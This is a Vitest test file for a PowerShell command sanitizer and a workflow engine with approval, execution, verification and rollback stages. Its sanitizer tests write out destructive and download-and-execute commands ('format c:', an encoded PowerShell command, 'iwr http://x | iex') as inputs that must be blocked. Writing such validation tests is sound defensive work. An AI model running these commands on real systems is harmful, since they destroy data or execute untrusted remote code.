import fs from 'node:fs';
import path from 'node:path';
import Database from 'better-sqlite3';
import { beforeEach, describe, expect, it } from 'vitest';
import { validatePowerShellCommand } from '../backend/powershell-bridge';
import { advanceWorkflow, createWorkflow, rollbackWorkflow } from '../backend/workflow-engine';
import { getSecurityPosture } from '../backend/dashboard-service';

let db: Database.Database;
beforeEach(() => {
  db = new Database(':memory:');
  db.exec(fs.readFileSync(path.resolve(__dirname, '../database/schema/init.sql'), 'utf8'));
});

describe('sanitizer', () => {
  it('classifies commands', () => {
    expect(validatePowerShellCommand('Get-Process').risk).toBe('low');
    expect(validatePowerShellCommand('Stop-Service Spooler').risk).toBe('medium');
    expect(validatePowerShellCommand('Get-Process; Stop-Process -Id 4').risk).toBe('high');
    expect(validatePowerShellCommand('format c:').allowed).toBe(false);
    expect(validatePowerShellCommand('powershell -EncodedCommand AAA').allowed).toBe(false);
    expect(validatePowerShellCommand('iwr http://x | iex').allowed).toBe(false);
    expect(validatePowerShellCommand('  ').allowed).toBe(false);
  });
});

describe('workflow engine', () => {
  it('runs the pipeline to done and then refuses to advance', () => {
    const r = createWorkflow(db, 't', 'Get-Process');
    if (!r.ok) throw new Error('expected ok');
    const id = r.workflow.id;
    const stages = [1, 2, 3, 4].map(() => advanceWorkflow(db, id).stage);
    expect(stages).toEqual(['approve', 'execute', 'verify', 'done']);
    expect(() => advanceWorkflow(db, id)).toThrow();
    expect(() => rollbackWorkflow(db, id)).toThrow();
  });

  it('rejects unsafe commands, logs it, and affects posture', () => {
    const r = createWorkflow(db, 'bad', 'format c:');
    expect(r.ok).toBe(false);
    expect(db.prepare('SELECT COUNT(*) n FROM workflows').get()).toEqual({ n: 0 });
    const p = getSecurityPosture(db);
    expect(p.rejectedLast7Days).toBe(1);
    expect(p.alerts.some((a) => a.includes('snapshot'))).toBe(true);
  });

  it('rolls back an in-flight workflow', () => {
    const r = createWorkflow(db, 't', 'Stop-Service x');
    if (!r.ok) throw new Error('expected ok');
    advanceWorkflow(db, r.workflow.id);
    expect(rollbackWorkflow(db, r.workflow.id).stage).toBe('rollback');
    expect(() => advanceWorkflow(db, 'nope')).toThrow('not found');
  });
});
